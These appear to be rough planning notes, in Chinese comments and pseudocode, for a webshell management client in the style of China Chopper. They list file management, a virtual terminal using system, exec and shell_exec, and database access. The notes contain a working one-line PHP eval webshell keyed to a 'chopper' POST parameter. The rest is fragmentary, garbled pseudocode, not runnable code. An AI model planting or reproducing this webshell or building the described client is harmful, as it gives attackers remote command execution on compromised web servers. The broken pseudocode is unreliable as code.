# @eval($_post['cmd'])
# 1二进制流保存
# 2创建文件并写入文件在同一个数据包
#
# 1，文件管理，
# 上传文件，删除文件，下载文件，列目录
# 2，虚拟终端
# system，exec,shell_exec
# 3数据库管理
<?php @eval($_POST['chopper']);?>
import os
class file：
fun文件管理：
fun删除文件：
...
class cmd：
”
class请求（payload）：
main：
输入ur1+参数名
输入命令
if（）：
请求（）|